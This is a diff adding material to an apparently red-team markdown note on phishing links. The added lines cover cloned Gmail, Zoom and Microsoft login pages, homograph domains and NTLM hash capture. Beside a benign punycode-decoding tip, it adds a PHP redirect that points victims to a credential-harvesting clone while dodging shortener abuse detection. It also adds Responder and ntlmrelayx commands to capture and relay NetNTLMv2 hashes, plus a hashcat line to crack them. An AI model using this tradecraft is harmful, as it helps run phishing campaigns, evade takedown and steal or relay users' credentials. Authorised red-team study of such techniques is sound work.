@@ -63,9 +63,30 @@ Host a clone of a commonly used service — **Gmail, Zoom, Microsoft login** —
 - **Valid HTTPS/TLS** is required — an insecure-site browser warning kills the pretext instantly (same principle as [[Enhancing phishing through social engineering]]).
 - Avoid random or context-mismatched strings in the URL itself — they're an easy visual tell.
 
+> [!tip] Decoding a suspected homograph domain
+> ```bash
+> idn2 --decode xn--80ak6aa92e.com
+> python3 -c "print('аррӏе.com'.encode('idna').decode())"
+> ```
+> Converts the Unicode/punycode form back to its ASCII `xn--` representation (or vice versa) so the substitution is obvious rather than relying on eyeballing near-identical glyphs.
+
+> [!danger] URL shortener gets killed mid-campaign
+> Once a provider (TinyURL, Bitly) flags a link as malicious, it stops resolving — and any recipient who hasn't clicked yet gets an obvious dead end instead of the clone. A self-hosted redirect avoids depending on a third party's abuse detection:
+> ```php
+> <?php header("Location: https://clone-site.example/signin.html"); exit; ?>
+> ```
+> Serve that on a short, innocuous-looking path on infrastructure you control instead of a public shortener.
+
 ## NTLM hash capture via forced authentication
 
 Even as NTLM is being deprecated, older systems remain vulnerable to **authentication leak** attacks: a malicious link — or even just an **embedded image pointing to a UNC/SMB path** — can trigger an NTLM handshake the moment it's rendered, letting the attacker capture a **NetNTLMv2 hash** without any click on a hyperlink at all. Dated, but still spotted in the wild as recently as **February 2024**.
+
+> [!tip] Capturing and relaying the hash
+> ```bash
+> sudo responder -I eth0 -wv          # listens for and captures NetNTLMv2 hashes
+> impacket-ntlmrelayx -tf targets.txt -smb2support   # relay captured auth onward instead of just cracking it
+> ```
+> Crack a captured hash offline with `hashcat -m 5600 hash.txt wordlist.txt` if relaying isn't viable against the target.
 
 > [!success] What a convincing link looks like
 > Valid HTTPS, a domain that's shortened or homograph-disguised well enough to survive a glance, and a pretext that explains the click naturally — combined, for credential harvesting, with either no password manager present or a target who types credentials manually anyway.
